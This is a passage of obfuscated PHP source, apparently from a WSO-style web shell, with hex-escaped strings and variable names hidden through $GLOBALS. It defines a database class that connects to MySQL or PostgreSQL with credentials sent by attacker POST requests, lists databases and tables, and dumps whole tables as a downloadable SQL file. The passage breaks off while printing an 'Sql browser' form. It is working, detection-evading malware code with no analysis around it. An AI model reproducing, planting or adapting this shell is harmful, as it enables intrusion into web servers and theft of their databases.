6e\x70\x75t \x74y\x70\x65\x3ds\x75\x62m\x69\x74 \x76al\x75e=\"S\x75b\x6d\x69t\"\x3e</\x74\x64></\x74r\x3e</\x66o\x72m></tab\x6c\x65\x3e";echo"</di\x76\x3e<\x62r\x3e";printFooter();}function actionSql(){${"G\x4c\x4f\x42AL\x53"}["\x70\x6d\x61\x75\x68\x74"]="\x64\x62";class DbClass{var$type;var$link;var$res;function DbClass($type){$this->type=${${"\x47\x4cO\x42ALS"}["\x64t\x70tk\x70h\x78\x69\x73\x64\x6b"]};}function connect($host,$user,$pass,$dbname){${"\x47\x4cO\x42\x41L\x53"}["\x6c\x77b\x72f\x70\x64g\x79\x6a\x6f"]="\x70a\x73s";$edoiuvsjh="\x75\x73\x65\x72";switch($this->type){case"\x6dy\x73ql":if($this->link=@mysql_connect($host,${$edoiuvsjh},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6c\x77\x62r\x66\x70d\x67\x79\x6ao"]},true))return true;break;case"p\x67s\x71\x6c":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("\x68\x6f\x73t={$host[0]}\x20port\x3d{$host[1]} \x75\x73\x65r\x3d$user pa\x73\x73\x77\x6frd\x3d$pass d\x62n\x61m\x65=$dbname"))return true;break;}return false;}function selectdb($db){$rbymypct="\x64\x62";switch($this->type){case"\x6d\x79\x73ql":if(@mysql_select_db(${$rbymypct}))return true;break;}return false;}function query($str){$eitvryp="\x73\x74r";switch($this->type){case"my\x73q\x6c":return$this->res=@mysql_query(${$eitvryp});break;case"p\x67s\x71\x6c":return$this->res=@pg_query($this->link,${${"\x47\x4cO\x42AL\x53"}["be\x6d\x71\x72\x6a\x78"]});break;}return false;}function fetch(){$musjkmjnrr="\x72\x65\x73";${$musjkmjnrr}=func_num_args()?func_get_arg(0):$this->res;${"\x47\x4cO\x42\x41LS"}["\x70\x62\x68\x68\x79\x65\x6b"]="\x72\x65\x73";switch($this->type){case"\x6d\x79\x73\x71\x6c":return@mysql_fetch_assoc(${${"G\x4c\x4f\x42\x41\x4c\x53"}["n\x77a\x61\x77\x6dp\x73"]});break;case"\x70\x67\x73ql":return@pg_fetch_assoc(${${"\x47LO\x42\x41\x4c\x53"}["p\x62h\x68y\x65\x6b"]});break;}return false;}function listDbs(){switch($this->type){case"\x6d\x79s\x71l":return$this->res=@mysql_list_dbs($this->link);break;case"\x70\x67\x73\x71l":return$this->res=$this->query("\x53E\x4cECT \x64at\x6eam\x65 FRO\x4d\x20pg_\x64a\x74aba\x73e");break;}return false;}function listTables(){switch($this->type){case"\x6dysql":return$this->res=$this->query("SHO\x57 \x54\x41BLES");break;case"\x70g\x73q\x6c":return$this->res=$this->query("s\x65\x6c\x65ct\x20\x74a\x62\x6c\x65\x5f\x6ea\x6d\x65\x20fr\x6fm infor\x6datio\x6e\x5f\x73ch\x65ma.\x74a\x62l\x65s w\x68e\x72\x65 (\x74\x61\x62l\x65\x5f\x73ch\x65m\x61 \x21\x3d\x20\x27\x69\x6efor\x6dat\x69\x6f\x6e\x5fsc\x68e\x6da\x27\x20\x41\x4e\x44\x20t\x61\x62\x6ce\x5f\x73\x63he\x6d\x61\x20!= \x27\x70g\x5f\x63a\x74\x61\x6c\x6fg')\x20or\x20\x74\x61b\x6ce\x5fname \x3d\x20'\x70\x67\x5fu\x73e\x72\x27");break;}return false;}function error(){switch($this->type){case"m\x79\x73\x71\x6c":return@mysql_error($this->link);break;case"\x70g\x73q\x6c":return@pg_last_error($this->link);break;}return false;}function setCharset($str){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71tqd\x78\x6a\x6a\x70\x66\x67"]="\x73\x74\x72";$grmoolf="s\x74\x72";switch($this->type){case"\x6d\x79sql":if(function_exists("\x6d\x79\x73q\x6c\x5f\x73et\x5f\x63\x68ar\x73\x65\x74"))return@mysql_set_charset(${${"\x47\x4cO\x42\x41\x4cS"}["\x71\x74q\x64\x78\x6aj\x70fg"]},$this->link);else$this->query("\x53E\x54 CHA\x52SET\x20".${${"\x47\x4c\x4fBALS"}["\x62e\x6dq\x72\x6a\x78"]});break;case"mys\x71l":return@pg_set_client_encoding($this->link,${$grmoolf});break;}return false;}function dump($table){$hutnrji="\x63\x72\x65a\x74e";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71\x6bk\x69\x66k"]="\x74\x61\x62l\x65";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6d\x76\x78xmfl\x64b\x67\x6bm"]="\x69\x74\x65\x6d";$bvqgxbinnr="\x72\x65\x73";switch($this->type){case"m\x79\x73q\x6c":${$bvqgxbinnr}=$this->query("S\x48\x4fW\x20\x43\x52\x45\x41\x54\x45 T\x41B\x4c\x45 `".${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71k\x6b\x69fk"]}."`");${$hutnrji}=mysql_fetch_array(${${"\x47\x4cO\x42A\x4c\x53"}["n\x77\x61\x61w\x6dps"]});echo${${"GL\x4fB\x41\x4c\x53"}["pb\x7ait\x70\x76\x63\x6b\x74"]}[1]."\x3b\n\n";$this->query("\x53\x45LECT\x20* F\x52OM \x60".${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x78\x73t\x73gw\x6d\x79\x69i\x71"]}."\x60");while(${${"G\x4c\x4fBA\x4cS"}["\x74\x7a\x6e\x63swqu\x77\x74o"]}=$this->fetch()){$qogdnp="\x63\x6f\x6c\x75mn\x73";$wtgmpoiq="\x6b";$qlaujdsecec="i\x74\x65m";${"\x47\x4c\x4fB\x41L\x53"}["vn\x69\x72\x6ds\x70\x69af"]="v";${"G\x4c\x4fB\x41LS"}["hs\x76x\x64\x67\x76"]="\x63o\x6c\x75\x6dn\x73";${$qogdnp}=array();foreach(${$qlaujdsecec} as${$wtgmpoiq}=>${${"\x47\x4cOBA\x4c\x53"}["vn\x69\x72\x6d\x73\x70\x69af"]}){$jqyfdvb="k";$qefhowc="c\x6fl\x75\x6d\x6es";${"G\x4cO\x42A\x4c\x53"}["\x6as\x75\x63\x65\x6c"]="k";${${"GL\x4f\x42\x41\x4c\x53"}["\x74\x7a\x6e\x63s\x77\x71\x75\x77to"]}[${$jqyfdvb}]="'".@mysql_real_escape_string(${${"\x47L\x4f\x42\x41\x4cS"}["h\x79ky\x76\x7a\x6f\x70\x75\x6e\x77\x74"]})."'";${$qefhowc}[]="\x60".${${"GL\x4f\x42\x41\x4cS"}["\x6as\x75\x63e\x6c"]}."`";}echo"IN\x53E\x52T I\x4eTO\x20\x60".${${"\x47\x4cO\x42\x41\x4cS"}["t\x78\x73\x74\x73gw\x6dy\x69iq"]}."` (".implode(", ",${${"\x47\x4c\x4f\x42\x41\x4cS"}["hs\x76\x78\x64\x67\x76"]}).") \x56ALU\x45S\x20(".implode(",\x20",${${"\x47\x4cO\x42\x41\x4c\x53"}["t\x7a\x6e\x63\x73wq\x75\x77t\x6f"]}).")\x3b"."\n";}break;case"\x70\x67s\x71l":$this->query("\x53EL\x45\x43\x54\x20* \x46ROM ".${${"\x47\x4cO\x42A\x4cS"}["tx\x73t\x73\x67\x77\x6d\x79\x69i\x71"]});while(${${"GLO\x42\x41\x4cS"}["\x6d\x76\x78x\x6d\x66\x6cd\x62\x67\x6b\x6d"]}=$this->fetch()){${"GLO\x42A\x4c\x53"}["\x66\x6a\x75\x78\x6d\x61\x74tk"]="c\x6f\x6c\x75\x6d\x6e\x73";$wprhxjwgnn="i\x74\x65\x6d";${"\x47\x4cOB\x41LS"}["\x6c\x71\x79g\x6b\x6f\x76tb\x69\x6d"]="v";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66j\x75\x78m\x61\x74\x74k"]}=array();$vcdlfnkdq="\x6b";foreach(${$wprhxjwgnn} as${$vcdlfnkdq}=>${${"G\x4c\x4fB\x41L\x53"}["\x6cq\x79\x67\x6b\x6f\x76\x74\x62i\x6d"]}){$nrdqyod="\x69t\x65\x6d";$xhzuslsqa="k";$neqrcg="\x6b";${$nrdqyod}[${$neqrcg}]="\x27".addslashes(${${"\x47L\x4f\x42\x41LS"}["\x68y\x6byv\x7ao\x70un\x77\x74"]})."'";${"\x47\x4cOB\x41\x4c\x53"}["ep\x74\x64\x64\x6f"]="\x63o\x6c\x75m\x6es";${${"\x47\x4c\x4f\x42A\x4c\x53"}["e\x70\x74\x64\x64o"]}[]=${$xhzuslsqa};}echo"I\x4eS\x45\x52T\x20I\x4e\x54\x4f ".${${"\x47\x4c\x4fB\x41\x4cS"}["\x74\x78s\x74\x73\x67\x77\x6d\x79i\x69q"]}."\x20(".implode(", ",${${"\x47LO\x42\x41\x4c\x53"}["x\x67y\x79\x64\x70\x74p"]}).")\x20\x56\x41L\x55\x45S (".implode(",\x20",${${"\x47\x4c\x4fBA\x4cS"}["\x74\x7a\x6e\x63\x73w\x71uwt\x6f"]}).")\x3b"."\n";}break;}return false;}}${${"G\x4c\x4f\x42A\x4c\x53"}["\x70\x6d\x61u\x68t"]}=new DbClass($_POST["ty\x70e"]);if(@$_POST["p\x32"]=="downl\x6fad"){ob_start("\x6fb_\x67zh\x61n\x64ler",4096);$db->connect($_POST["\x73ql\x5f\x68\x6f\x73\x74"],$_POST["\x73\x71l_\x6c\x6f\x67i\x6e"],$_POST["sql\x5f\x70a\x73\x73"],$_POST["s\x71\x6c_\x62a\x73\x65"]);$db->selectdb($_POST["sq\x6c\x5f\x62ase"]);header("Conte\x6et-D\x69s\x70\x6f\x73iti\x6fn:\x20att\x61c\x68\x6d\x65\x6et; f\x69\x6cena\x6de\x3dd\x75\x6dp\x2esq\x6c");header("\x43\x6f\x6et\x65nt-T\x79\x70\x65:\x20t\x65\x78t/p\x6ca\x69n");foreach($_POST["t\x62l"]as${${"\x47\x4c\x4f\x42\x41LS"}["\x68\x79\x6by\x76\x7aop\x75\x6ewt"]})$db->dump(${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x68y\x6b\x79\x76\x7ao\x70\x75\x6e\x77t"]});exit;}printHeader();echo "\t\x3c\x681\x3e\x53\x71l\x20\x62ro\x77\x73\x65\x72\x3c/h1\x3e\x3c\x64i\x76 clas\x73\x3dc\x6f\x6e\x74e\x6e\x74\x3e\n\t\x3cf\x6f\x72\x6d \x6e\x61m\x65\x3d\x22\x73\x66\"\x20\x6d\x65t\x68od=\"\x70o\x73t\">\n\t\t\x3ct\x61\x62\x6c\x65\x20\x63\x65l\x6c\x70a\x64\x64\x69ng=\"2\" \x63el\x6c\x73pac\x69ng=\"\x30\x22>\n\t\t\t\x3c\x74\x72\x3e\n\t\t\t\t\x3ctd\x3e\x54\x79\x70e</\x74\x64\x3e\n\t\t\t\t\x3ct\x64\x3eH\x6fs\x74\x3c/\x74\x64\x3e\n\t\t\t\t<\x74d\x3e\x4cog\x69\x6e</t\x64>\n\t\t\t\t<\x74\x64>\x50\x61\x73\x73w\x6frd\x3c/t\x64>\n\t\t\t\t\x3c\x74d>Da\x74aba\x73e\x3c/\x74d\x3e\n\t\t\t\t<\x74\x64\x3e</\x74d\x3e\n\t\t\t\x3c/t\x72\x3e\n\t\t\t\x3ctr\x3e\n\t\t\t\t<inp\x75\x74\x20t\x79pe\x3dhi\x64\x64\x65\x6e\x20n\x61me=\x61 \x76al\x75e\x3d\x53\x71\x6c\x3e\n\t\t\t